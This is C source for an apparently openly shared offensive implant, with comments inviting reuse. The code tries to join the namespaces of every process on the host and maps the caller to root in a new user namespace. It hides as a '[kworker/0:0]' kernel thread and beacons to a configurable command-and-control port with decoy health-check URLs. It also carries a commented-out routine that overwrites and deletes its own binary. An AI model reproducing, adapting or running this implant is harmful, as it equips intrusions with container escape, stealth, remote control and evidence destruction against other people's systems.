// Tweak'd, follow my X account @0xmadvise
// You can modify it, extend the caps and do whatever u like w it.
// Blog at https://hackmd.io/@0xmadvise/rJPLNLRwlx

#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <string.h>
#include <sys/stat.h>

#define TAG     "[kworker/0:0]" /* `prctl(PR_SET_NAME, "[kworker/0:0]")`  the child procname */
#define C2PORT  8443 /* Change this or even fully modify how the beacon comms with your C2 */ 
#define REPS    5

static const char *NS[]  = {"user","pid","net","mnt","ipc","uts","cgroup"};
static const char *EP[]  = {"/health","/status","/metrics","/api/v1/check","/internal/ping"};

static void report(const char *m) {
    int s = socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, 0);
    struct sockaddr_in a = { .sin_family = AF_INET, .sin_port = htons(C2PORT) };
    inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
    if (s>0 && connect(s, (void*)&a, sizeof(a))==0) {
        char b[128];
        int l = snprintf(b, sizeof(b),
            "GET /error/%s HTTP/1.1\r\nHost:localhost\r\nConnection:close\r\n\r\n", m);
        send(s, b, l, MSG_NOSIGNAL);
    }
    if (s>0) close(s);
}

static void join_all(void) {
    DIR *d = opendir("/proc"); struct dirent *e;
    while ((e = readdir(d))) {
        if (!isdigit(e->d_name[0])) continue;
        int p = atoi(e->d_name);
        if (p<2) continue;
        for (int i=0; i<sizeof(NS)/sizeof(*NS); i++) {
            char P[64];
            snprintf(P, sizeof(P), "/proc/%d/ns/%s", p, NS[i]);
            int f = open(P, O_RDONLY);
            if (f<0) continue;
            setns(f, 0);
            close(f);
        }
    }
    closedir(d);
}

static void elevate(void) {
    if (unshare(CLONE_NEWUSER)==0) {
        int f = open("/proc/self/setgroups", O_WRONLY);
        if (f>0) { write(f, "deny\n",5); close(f); }
        char m[64];
        snprintf(m, sizeof(m), "0 %d 1\n", getuid());
        f = open("/proc/self/uid_map", O_WRONLY);
        if (f>0) { write(f, m, strlen(m)); close(f); }
        snprintf(m, sizeof(m), "0 %d 1\n", getgid());
        f = open("/proc/self/gid_map", O_WRONLY);
        if (f>0) { write(f, m, strlen(m)); close(f); }
    }
}

static void daemonize(void) {
    signal(SIGCHLD, SIG_IGN);
    if (fork()) _exit(0);
    setsid();
    prctl(PR_SET_NAME, TAG, 0,0,0);
    int d = open("/dev/null", O_RDWR);
    dup2(d,0); dup2(d,1); dup2(d,2);
    if (d>2) close(d);
}

static void beacon(void) {
    int s = socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, 0);
    struct sockaddr_in a = { .sin_family = AF_INET, .sin_port = htons(C2PORT) };
    inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
    if (s>0 && connect(s,(void*)&a,sizeof(a))==0) {
        srand(time(NULL) ^ getpid());
        const char *u = EP[rand()%(sizeof(EP)/sizeof(*EP))];
        char b[128];
        int l = snprintf(b, sizeof(b),
            "GET %s HTTP/1.1\r\nHost:localhost\r\nConnection:close\r\n\r\n", u);
        send(s, b, l, MSG_NOSIGNAL);
    }
    if (s>0) close(s);
}

/*
// Havent tried this but you can uncomment it and try it yourself, and maybe tweak a bit in order for it to work without accidentally killing your child
// Mentioned in the blog too.

static void self_delete(void) {
    int f = open("/proc/self/exe", O_RDWR|O_CLOEXEC);
    if (f<0) return;
    struct stat st; fstat(f, &st);
    size_t rem = st.st_size, w;
    char zeros[4096] = {0};
    lseek(f, 0, SEEK_SET);
    while (rem) {
        w = rem > sizeof(zeros) ? sizeof(zeros) : rem;
        write(f, zeros, w);
        rem -= w;
    }
    unlink("/proc/self/exe");
    close(f);
}
//
*/

int main(void) {
    join_all();
    elevate();
    join_all();
    daemonize();
    for (int i=0; i<REPS; i++) {
        beacon();
        sleep(2 + rand()%2);
    }
    report("Completed");
    /* self_delete(); */
    return 0;
}
